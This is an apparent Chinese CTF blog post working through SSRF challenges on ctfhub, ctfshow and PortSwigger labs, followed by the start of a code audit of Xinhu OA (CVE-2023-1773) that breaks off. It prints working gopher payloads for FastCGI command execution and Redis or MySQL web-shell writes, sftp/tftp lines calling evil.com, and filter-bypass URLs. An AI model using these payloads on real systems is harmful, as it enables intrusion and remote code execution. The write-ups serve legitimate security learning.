ctfhub-端口扫描(dict:&#x2F;&#x2F;)dict 协议是一个字典服务器协议，通常用于让客户端使用过程中能够访问更多的字典源，能用来探测端口的指纹信息协议格式：dict://&lt;host&gt;:&lt;port&gt;/&lt;dict-path&gt;一般用dict://&lt;host&gt;:&lt;port&gt;/info 探测端口应用信息
举个栗子:
dict://127.0.0.1:6379 //探测redis是否存活dict://127.0.0.1:6379/info //探测端口应用信息

利用bp中的爆破模块进行端口爆破

得到长度明显与其他不一样的端口号，访问，得到flag

sftp:&#x2F;&#x2F;在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。
Copyhttp://example.com/ssrf.php?url=sftp://evil.com:1337/ evil.com:$ nc -lvp 1337Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2

ldap:&#x2F;&#x2F;或ldaps:&#x2F;&#x2F; 或ldapi:&#x2F;&#x2F;LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。
Copyhttp://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit

tftp:&#x2F;&#x2F;TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。
Copyhttp://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET evil.com:# nc -lvup 1337Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3

Gopher协议初步使用Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；

gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议

对于使用Gopher协议的条件：
Gopher协议格式：
URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流


gopher的默认端口是70
如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码

Gopher发送请求HTTP GET请求：
（可以在xshell里面开两个会话）
使用Gopher协议发送一个请求，环境为：nc起一个监听，curl发送gopher请求
nc启动监听，监听2333端口：nc -lp 2333
使用curl发送http请求，命令为
curl gopher://192.168.0.119:2333/abcd

此时nc收到的消息为：bcd
如果想要接收到所有的消息，需要在使用gopher协议时在url后加入一个字符（该字符可随意写）
Gopher发送请求HTTP GET请求：
需要以下三步：

1、构造HTTP数据包2、URL编码、替换回车换行为%0d%0a3、发送gopher协议

我准备了一个PHP的代码，如下：
&lt;?php    echo &quot;Hello &quot;.$_GET[&quot;name&quot;].&quot;\n&quot;?&gt;

一个GET型的HTTP包，如下：
GET /ssrf/base/get.php?name=Margin HTTP/1.1Host: 1.0.0.1

URL编码后为：
curl gopher://1.0.0.1:80/_GET%20/ssrf/base/get.php%3fname=Margin%20HTTP/1.1%0d%0AHost:%201.0.0.1%0d%0A

在转换为URL编码时候有这么几个坑

1、问号（？）需要转码为URL编码，也就是%3f2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）

Gopher发送请求HTTP POST请求：
以下四个参数为post传参时所必须的参数：
POST /ssrf/base/post.php HTTP/1.1host:192.168.0.109Content-Type:application/x-www-form-urlencodedContent-Length:11name=Margin

post.php的代码为
&lt;?php    echo &quot;Hello &quot;.$_POST[&quot;name&quot;].&quot;\n&quot;?&gt;

使用curl发起gopher的POST请求并进行url编码：
curl gopher://0.0.0.1:80/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0AHost:0.0.0.1%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname=Margin%0d%0A

发送成功
使用Gopher协议url编码次数传参经过多少次跳转就需要经过多少次url编码。
直接curl后接gopher:&#x2F;&#x2F;就编码一次。
利用?url&#x3D;gopher:&#x2F;&#x2F;就编码两次。
还经过302跳转，就编码三次。
ctfshow实战web-351&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);?&gt;

对上述代码的解析如下：

禁止显示 PHP 错误报告，使用 error_reporting(0)；
使用 highlight_file(__FILE__) 显示当前 PHP 文件的源代码；
获取通过 POST 请求传递的 URL，存储在 $url 变量中；
使用 curl_init() 初始化一个 cURL 会话；
使用 curl_setopt() 函数设置 cURL 选项，包括关闭 HTTP 头信息的输出（CURLOPT_HEADER）以及将返回的数据以字符串形式返回（CURLOPT_RETURNTRANSFER）；
使用 curl_exec() 函数执行 cURL 会话，获取 URL 对应页面的内容，并将结果存储在 $result 变量中；
使用 curl_close() 函数关闭 cURL 会话；
最后，使用 echo 输出获取到的页面内容

尝试一下能不能访问内网：url=127.0.0.1，页面又回显了一遍上述代码，说明可以
盲猜一波flag.php在当前目录下：url=127.0.0.1/flag.php回显出flag，也可以url=localhost/flag.php
web-352&amp;353&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;if(!preg_match(&#x27;/localhost|127.0.0/&#x27;))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;&#125;else&#123;    die(&#x27;hacker&#x27;);&#125; ?&gt;

可以对127.0.0.1进行编码绕过，具体进上面文章中的绕过方法（句号的方法行不通）
url=http://2130706433/flag.php：得到flag
在Linux环境中，0代表自身地址，也可以url=http://0/flag.php
web-354（sudo.cc）&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;if(!preg_match(&#x27;/localhost|1|0|。/i&#x27;, $url))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;?

sudo.cc相当于127.0.0.1 
url=http://sudo.cc/flag.php：得到flag
web-355&amp;356&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;$host=$x[&#x27;host&#x27;];if((strlen($host)&lt;=5))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;?&gt;

strlen($host)&lt;=5：要求输入的主机名长度小于等于5
这里我们可以采用0来绕过：url=http://0/flag.php
web-356：主机名长度要求小于等于3
web-357&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;$ip = gethostbyname($x[&#x27;host&#x27;]);echo &#x27;&lt;/br&gt;&#x27;.$ip.&#x27;&lt;/br&gt;&#x27;;if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;    die(&#x27;ip!&#x27;);&#125;echo file_get_contents($_POST[&#x27;url&#x27;]);&#125;else&#123;    die(&#x27;scheme&#x27;);&#125;?&gt;

if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;     die(&#39;ip!&#39;); &#125;：验证IP地址是否有效，并且不是私有IP地址或保留IP地址，验证失败的话就会输出ip并停止运行
这说明了地址不能是127.0.0.1，所以我们可以采用302跳转的方式来进入内网
在服务器上面开一个端口，并且其php文件如下：
&lt;?php header(&quot;Location:http://127.0.0.1/flag.php&quot;);

然后在get传参为：?url=http://555.555.555.555:555，得到flag，题目解决
web-358&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if(preg_match(&#x27;/^http:\/\/ctf\..*show$/i&#x27;,$url))&#123;    echo file_get_contents($url);&#125;

parse_url解析问题，参考文章：parse_url小结
根据参考文章和本片文章前面提到过的绕过方法，最后的payload为：http://ctf.@127.0.0.1/flag.php#show
其实将#改为？也是可以的
web-359这题是要打无密码保护的mysql
首先我们开启proxy，登录一下，在bp的代理模块的HTTP历史记录中找到/check.php，内容如下：

可以发现Post传参中有returl，参数是网址，我们可以使用gopher协议来操作
所以我们可以采用工具gopherus（在下文的CTFHub中我有提供下载的链接）
我们输入命令：python2 gopherus.py --exploit mysql，剩下的如下：select &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile &#39;/var/www/html/aa.php&#39;;：这条命令是使用数据库的功能创建一个php文件，文件位置在/var/www/html/aa.php
得到的payload再拿去编码一次后拿去使用，然后再用蚁剑包含该文件便可以了
得到flag，题目解决
web-360这题题目叫打redis
 &lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);?&gt;

于是我们跟上题一样，用gopherus工具来打
步骤跟下面ctfhub里面的Redis协议的操作步骤一模一样，这里就不多说了
CTFHubPOST请求在题目环境中访问：?url=127.0.0.1/flag.php，看到页面弹出一个输入框，查看源码如下：
&lt;form action=&quot;/flag.php&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;&lt;!-- Debug: key=7cc8e7f97ec84ca8f88fed4a62df26d1--&gt;&lt;/form&gt;

将该值填入输入框，得到回显为：Just View From 127.0.0.1
然后访问：?url=file:///var/www/html/index.php，得到如下代码：
&lt;?php// 关闭所有错误报告error_reporting(0);// 检查请求中是否包含 &#x27;url&#x27; 参数if (!isset($_REQUEST[&#x27;url&#x27;]))&#123;    // 如果没有 &#x27;url&#x27; 参数，重定向到自身并附加一个默认的 &#x27;url&#x27; 参数    header(&quot;Location: /?url=_&quot;);    exit; // 终止脚本执行&#125;// 初始化一个cURL会话$ch = curl_init();// 设置cURL选项curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#x27;url&#x27;]); // 设置要请求的URL为用户提供的 &#x27;url&#x27; 参数值curl_setopt($ch, CURLOPT_HEADER, 0); // 不包含头部信息在输出中curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); // 允许cURL处理重定向// 执行cURL会话curl_exec($ch);// 关闭cURL会话并释放资源curl_close($ch);

访问：?url=file:///var/www/html/flag.php，代码如下：
&lt;?php// 关闭所有错误报告error_reporting(0);// 检查访问者的IP地址是否为127.0.0.1if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;    echo &quot;Just View From 127.0.0.1&quot;;    return;&#125;// 获取环境变量 &quot;CTFHUB&quot; 的值$flag = getenv(&quot;CTFHUB&quot;);// 生成flag的MD5哈希值$key = md5($flag);// 检查POST请求中是否包含正确的keyif (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;    // 如果POST请求中的key正确，输出flag    echo $flag;    exit;&#125;?&gt;&lt;!-- HTML表单，提交到当前脚本 --&gt;&lt;form action=&quot;/flag.php&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;&lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt;&lt;/form&gt;

由于 $_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;这个无法绕过，所以无法利用flag.php，所以只能尝试通过index.php向目标发送post请求
尝试使用 Gopher 协议向服务器发送 POST 包首先构造 Gopher协议所需的 POST请求：
POST /flag.php HTTP/1.1Host: 127.0.0.1:80Content-Length: 36Content-Type: application/x-www-form-urlencodedkey=7cc8e7f97ec84ca8f88fed4a62df26d1

根据上面的知识我们知道我们需要编码两次，第一次编码如下：
POST%20/flag.php%20HTTP/1.1%0AHost%3A%20127.0.0.1%3A80%0AContent-Length%3A%2036%0AContent-Type%3A%20application/x-www-form-urlencoded%0A%0Akey=7cc8e7f97ec84ca8f88fed4a62df26d1

 在第一次编码后的数据中，将%0A全部替换为%0D%0A，如下：
POST%20/flag.php%20HTTP/1.1%0D%0AHost:%20127.0.0.1:80%0AContent-Length:%2036%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Akey=7cc8e7f97ec84ca8f88fed4a62df26d1

将其进行第二次编码，如下：
POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1%253A80%250AContent-Length:%252036%250D%250AContent-Type:%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey=7cc8e7f97ec84ca8f88fed4a62df26d1

所以我们可以构造payload如下：
view-source:http://challenge-6e02fe4cf49383ad.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Length:%252036%250D%250AContent-Type:%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey=7cc8e7f97ec84ca8f88fed4a62df26d1

上传文件我们尝试访问 ?/url=127.0.0.1/flag.php
发现上传页面并没有提交按钮
我们可以通过查看源码，并在from表单中写入 submit  ，如下图：
&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt; 我们随便上传一个文件，页面提示：Just View From 127.0.0.1
让我们拦截一下上传请求，然后将改为我们所需要的（不是必要的可以删去），如下：
POST /flag.php HTTP/1.1Host: 127.0.0.1Content-Length: 288Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylc7CixnmWBKYEk99------WebKitFormBoundarylc7CixnmWBKYEk99Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;Content-Type: text/plainMancity------WebKitFormBoundarylc7CixnmWBKYEk99Content-Disposition: form-data; name=&quot;submit&quot;提交------WebKitFormBoundarylc7CixnmWBKYEk99--

按照上面的步骤进行编码，最后payload如下：
?url=gopher://127.0.0.1:80/_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%2520288%250D%250AContent-Type%253A%2520multipart%252Fform-data%253B%2520boundary%253D----WebKitFormBoundarylc7CixnmWBKYEk99%250D%250A%250D%250A------WebKitFormBoundarylc7CixnmWBKYEk99%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522test.txt%2522%250D%250AContent-Type%253A%2520text%252Fplain%250D%250A%250D%250AMancity%250D%250A------WebKitFormBoundarylc7CixnmWBKYEk99%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25E6%258F%2590%25E4%25BA%25A4%250D%250A------WebKitFormBoundarylc7CixnmWBKYEk99--

发送，得到Flag
URL Bypass题目要求：请求的URL中必须包含http://notfound.ctfhub.com
所以我们可以利用http基本身份认证来进行绕过
payload为：?url=http://notfound.ctfhub.com@127.0.0.1/flag.php
得到flag，题目解决
数字IP Bypass如果说你直接输入：?url=127.0.0.1，那么题目会回显hacker! Ban &#39;/127|172|@/&#39;
这说明我们输入的内容里面不能有127，172，@
那么我们可以进制转换一下，比如把其转换为十进制：?url=2130706433/flag.php
得到flag，题目解决
302跳转 Bypass首先用file协议查看一下源码：?url=file://var/www/html/index.php，得到如下：
&lt;?phperror_reporting(0);if (!isset($_REQUEST[&#x27;url&#x27;])) &#123;    header(&quot;Location: /?url=_&quot;);    exit;&#125;$url = $_REQUEST[&#x27;url&#x27;];if (preg_match(&quot;/127|172|10|192/&quot;, $url)) &#123;    exit(&quot;hacker! Ban Intranet IP&quot;);&#125;$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_exec($ch);curl_close($ch);

第一种
可以看到正则表达式ban掉的数字，惊奇地发现没有ban掉localhost，所以我们可以尝试一下：?url=http://localhost/flag.php
得到flag，题目解决
第二种
进制转化，把127.0.0.1转化成其他进制的，也可以成功
第三种
当然这题的标准做法是要利用302跳转
让我们在服务器上面写一个php重定向文件，如下：
&lt;?php header(&quot;Location:http://127.0.0.1/flag.php&quot;);

把它放到公网上，然后用url访问就可以啦
DNS重绑定 Bypass访问：?url=file:///var/www/html/index.php，得到如下代码：
&lt;?phperror_reporting(0);if (!isset($_REQUEST[&#x27;url&#x27;])) &#123;    header(&quot;Location: /?url=_&quot;);    exit;&#125;$url = $_REQUEST[&#x27;url&#x27;];if (preg_match(&quot;/127|172|10|192/&quot;, $url)) &#123;    exit(&quot;hacker! Ban Intranet IP&quot;);&#125;$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_exec($ch);curl_close($ch);

但是按照上题的思路来做的话根本过不去
按照题目，这题就采用DNS重绑定来进行绕过吧
贴个文章可以去看看：浅谈DNS重绑定漏洞，当然上面我也有简单讲讲
利用文章提供的网址来进行利用：https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg

自己输入所需的网址，构造payload为：?url=7f000001.c0a80001.rbndr.us/flag.php
得到flag，题目解决
FastCGI协议必看原理 -&gt; 附件文章在这里
关于FastCGI协议附件文章讲的很明白了
关于这个协议我们主要就是要利用一个 PHP-FPM未授权访问漏洞，PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。
接下来用到的EXP，就是根据之前介绍的fastcgi协议来编写的，代码如下：https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75 。兼容Python2和Python3，方便在内网用
我们这里使用Gopherus脚本(GitHub下载)构造payload，该脚本只能在python2.7下运行
然后可以将解压完后的文件夹挪到虚拟机里面，执行：apt install python2，安装python2
然后执行命令：python2 gopherus.py --exploit fastcgi，页面选择index.php，命令选择ls
把获得的pyload拿去再编码一次就可以
然后再来一遍，这次命令选择cat /f*，得到pyload，拿去再编码一次，如下：
gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%25F6%2506%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH59%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2509SCRIPT_FILENAMEindex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%253B%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520%2Ff%252A%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500

拿去用，得到flag
Redis协议这次也是一样，用Gopherus脚本来完成该题
使用指令：python2 gopherus.py --exploit redis，选择php，默认路径，代码的话我们使用一句话代码：&lt;?php eval($_POST[&#39;cmd&#39;]); ?&gt;

得到payload，拿去再编码一次，如下：
gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A

拿去用，得到如下界面：

虽然是这样的，但是我们的shell.php已经写入了，访问，如下：
虽然有一些不可见字符啥的，但还是说明可以访问，用蚁剑连接，得到flag
Bp实验室Lab：针对本地服务器的基本SSRF题目：要解决实验室问题，请更改库存检查URL以访问 http://localhost/admin 的管理员界面并删除用户 carlos
于是我们先打开插件Proxy，然后访问任意一件商品，点击检查库存
做完这些步骤之后我们去bp的代理模块的HTTP历史记录中查看每个条目，最后发现一条可疑的：/product/stock，将它发送到重放器中，其post传参的stockApi其实就是编码后的访问库存的url，于是我们将其改为编码后的 http://localhost/admin，发送如下：

我们需要删除用户carlos，url改为：http://location/admin/delete?username=carlos，编码后发送
题目解决
Lab：基本SSRF与另一个后端系统的对比要求：要解决这个问题，请使用库存检查功能扫描端口8080上的管理员界面的内部 192.168.0.X 范围，然后使用它删除用户 carlos
于是我们先打开插件Proxy，然后访问任意一件商品，点击检查库存
做完这些步骤之后我们去bp的代理模块的HTTP历史记录中查看每个条目，最后发现一条可疑的：/product/stock，将它发送到intruder中，其post传参的stockApi改为我们所需要的：http%3A%2F%2F192.168.0.1%3A8080%2Fadmin，添加1位置为pyload，进行爆破，数值设为1到300，间隔为1，开始攻击
把爆破后的结果按状态码从小到大排序，得到200状态码的网址，后续的操作和上一题的一模一样
题目解决
Lab：带外检测的盲 SSRF要求：该网站使用分析软件，在加载产品页面时获取 Referer 标头中指定的 URL。要完成本实验，请使用此功能向公共 Burp Collaborator 服务器发出 HTTP 请求。
先打开插件Proxy，然后访问任意一件商品，之后我们去bp的代理模块的HTTP历史记录中查看每个条目，将/product?productId=1条目发送到重放器中，通过题目可知我们应该改变Referer标头的url，所以我们去Burp Collaborator复制一个，然后将其代替掉原本的url，点击发送，之后在Burp Collaborator模块点击立即轮询，可以查看到几条数据
到这步后，题目便解决了
Lab：具有基于黑名单的输入过滤器的 SSRF要求：要完成该实验，请将库存检查 URL 更改为访问管理界面 http://localhost/admin 并删除用户 carlos 。开发人员部署了两种较弱的反 SSRF 防御措施，您需要绕过它们
在bp的代理模块的HTTP历史记录中查看每个条目，然后将/product/stock发送到重放器中，先将stockApi改为http%3A%2F%2F127.0.0.1%2Fadmin，发送发现被阻止了
开始一步步尝试，先是http%3A%2F%2F127.1，发送成功，接着在后面加上/admin，被阻止，猜测是拦住了admin，所以我们可以将a编码两次，为http%3A%2F%2F127.0.0.1%2F%2561dmin，发送成功，访问到了admin页面，接下来的操作就是删除用户carlos
后面按之前那样做就可以了，题目解决
Lab：SSRF 通过开放重定向漏洞绕过过滤器描述：要完成该实验，请将库存检查 URL 更改为访问管理界面 http://192.168.0.12:8080/admin 并删除用户 carlos 。库存检查器被限制只能访问本地应用程序，因此您需要首先找到影响应用程序的开放重定向
首先随机访问一个产品并检查库存，然后点击next product
检查HTTP历史记录，有两条比较有意思的都将其发送到重放器中，分别是/product/stock和/product/nextProduct?currentProductId=1&amp;path=/product?productId=2 
第二个条目内容如下：

原本第一个条目的stockApi解码后为：/product/stock/check?productId=2&amp;storeId=1
尝试直接把第一个条目的stockApi改为我们需要的http%3A%2F%2F192.168.0.12%3A8080%2Fadmin，会被阻止访问
发现原本的stcockApi的内容和第二个条目中的get传参的参数是一样的
将第二个条目中的path改一下/product?productId=3，发送，然后把stockApi改为相对应的，发送，数据成功变更
这说明了我们通过更改path的内容实现了重定向，所以我们只需要把我们要的url放在path中：/product/nextProduct?path=http://192.168.0.12:8080/admin，发送，然后对应的stockApi改为：%2Fproduct%2FnextProduct%3Fpath%3Dhttp%3A%2F%2F192.168.0.12%3A8080%2Fadmin，发送，响应变为了对应的页面的内容，然后开始删除用户carlos
更改path：/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
更改stockApi：%2Fproduct%2FnextProduct%3Fpath%3Dhttp%3A%2F%2F192.168.0.12%3A8080%2Fadmin%2Fdelete%3Fusername%3Dcarlos
成功伤处用户carlos，题目解决
引用SSRF漏洞原理解析通俗易懂
SSRF漏洞原理攻击与防御(超详细总结)
Gopher协议在SSRF漏洞中的深入研究（附视频讲解）
CTFHub技能树 Web-SSRF篇（保姆级通过教程）
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计：CVE-2023-1773</title>
    <url>/2024/07/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ACVE-2023-1773/</url>
    <content><![CDATA[产品：信呼oa
影响版本：&lt;&#x3D;2.32
开源地址：https://github.com/rainrocka/xinhu/commits/master/
首先我们先起好docker镜像，默认登录账号名为admin，密码为123456
开始代码审计最最开始的时候，我们当然要看index.php的代码（代码块中的大部分注释为我自己写入进去的理解）如下：
&lt;?php include_once(&#x27;config/config.php&#x27;);$_uurl 		= $rock-&gt;get(&#x27;rewriteurl&#x27;);$d 			= &#x27;&#x27;;$m 			= &#x27;index&#x27;;$a 			= &#x27;default&#x27;;if($_uurl != &#x27;&#x27;)&#123;	unset($_GET[&#x27;m&#x27;]);unset($_GET[&#x27;d&#x27;]);unset($_GET[&#x27;a&#x27;]);//释放变量m,d,a	$m		= $_uurl;	$_uurla = explode(&#x27;_&#x27;, $_uurl);//以_来分割变量$_uurl为数组$_uurla	if(isset($_uurla[1]))&#123;$d = $_uurla[0];$m = $_uurla[1];&#125;	if(isset($_uurla[2]))&#123;$d = $_uurla[0];$m = $_uurla[1];$a = $_uurla[2];&#125;	$_uurla = explode(&#x27;?&#x27;,$_SERVER[&#x27;REQUEST_URI&#x27;]);//以?分割成URI的路径部分和查询字符串部分并赋给数组$_uurla	if(isset($_uurla[1]))&#123;		$_uurla = explode(&#x27;&amp;&#x27;, $_uurla[1]);//查询字符串部分用&amp;来分割，比如是&#x27;foo=bar&amp;baz=qux&#x27;被分割        foreach($_uurla as $_uurlas)&#123;//每个元素都是一个键值对			$_uurlasa = explode(&#x27;=&#x27;, $_uurlas);//用=分割成键和值两部分			if(isset($_uurlasa[1]))$_GET[$_uurlasa[0]]=$_uurlasa[1];            //如果有值，键是$_uurlasa[0]，值是$_uurlasa[1].比如$_GET[&#x27;foo&#x27;] = &#x27;bar&#x27;		&#125;	&#125;//遍历&#125;else&#123;	$m			= $rock-&gt;jm-&gt;gettoken(&#x27;m&#x27;, &#x27;index&#x27;);	$d			= $rock-&gt;jm-&gt;gettoken(&#x27;d&#x27;);	$a			= $rock-&gt;jm-&gt;gettoken(&#x27;a&#x27;, &#x27;default&#x27;);&#125;$ajaxbool	= $rock-&gt;jm-&gt;gettoken(&#x27;ajaxbool&#x27;, &#x27;false&#x27;);$mode		= $rock-&gt;get(&#x27;m&#x27;, $m);if(!$config[&#x27;install&#x27;] &amp;&amp; $mode != &#x27;install&#x27;)$rock-&gt;location(&#x27;?m=install&#x27;);include_once(&#x27;include/View.php&#x27;);

$_SERVER[&#39;REQUEST_URI&#39;]:

$_SERVER 是一个超全局变量，它包含了关于服务器环境和请求的信息。
&#39;REQUEST_URI&#39; 是 $_SERVER 数组中的一个键，它包含了当前请求的URI。例如，如果用户访问的是 http://example.com/path/to/page?foo=bar，那么 $_SERVER[&#39;REQUEST_URI&#39;] 的值就是 /path/to/page?foo=bar。

看完该份文件后我们需要注意三个变量：$m,$d,$a，以及该行代码$_uurl = $rock-&gt;get(&#39;rewriteurl&#39;);，思考其中的get()方法是什么，让我们溯源下去，该方法相关代码如下：
public function get($name,$dev=&#x27;&#x27;, $lx=0)	&#123;		$val=$dev;		if(isset($_GET[$name]))$val=$_GET[$name];		if($this-&gt;isempt($val))$val=$dev;    	//isempt函数：如果传入字符为空并且不是数字，则返回true		return $this-&gt;jmuncode($val, $lx, $name);    	//对特殊字符进行编码，空格消去，预防xss		&#125;

通过该方法获取GET传参中的值，并对xss进行了一定程度的预防
在index.php中末尾部分代码还包含了文件View.php，代码如下：
